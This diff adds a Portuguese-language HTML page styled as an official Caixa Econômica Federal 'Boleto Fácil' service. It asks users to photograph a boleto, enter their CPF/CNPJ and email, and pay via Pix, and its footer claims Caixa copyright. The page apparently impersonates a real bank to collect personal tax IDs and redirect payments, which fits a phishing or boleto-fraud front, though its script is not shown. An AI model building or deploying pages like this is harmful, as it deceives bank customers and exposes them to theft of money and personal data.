@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Caixa Loterias — Boleto Fácil</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><rect fill='%23005BAA' width='64' height='64' rx='8'/><text x='32' y='42' font-size='32' text-anchor='middle' fill='white' font-weight='bold'>C</text></svg>">
+  <link rel="stylesheet" href="css/estilo.css">
+</head>
+<body>
+  <div class="topo-caixa">
+    <div class="logo-caixa">CAIXA</div>
+    <div class="subtitulo">Loterias — Boleto Fácil</div>
+  </div>
+
+  <div class="container">
+    <h1>📷 Envie a foto do boleto</h1>
+    <p>Leitura automática e pagamento via Pix</p>
+
+    <input type="file" id="foto" accept="image/*" capture="environment">
+    <label for="foto" class="btn-upload">📷 Selecionar foto do boleto</label>
+
+    <div id="preview"></div>
+
+    <!-- ✅ CAMPOS MAIORES — MELHOR PARA CELULAR -->
+    <div id="camposUsuario" class="oculto">
+      <hr>
+      <h3>👤 Dados do Pagador</h3>
+      <input type="text" id="cpfCnpj" placeholder="CPF ou CNPJ (apenas números)" maxlength="18">
+      <input type="email" id="emailUsuario" placeholder="Seu e-mail">
+    </div>
+
+    <button id="btn" disabled>🔍 Processar Boleto</button>
+    <div id="res" class="oculto"></div>
+  </div>
+
+  <footer>
+    <p>© Caixa Econômica Federal — Serviço de Pagamento de Boletos</p>
+  </footer>
+
+  <script src="js/app.js"></script>
+</body>
+</html>
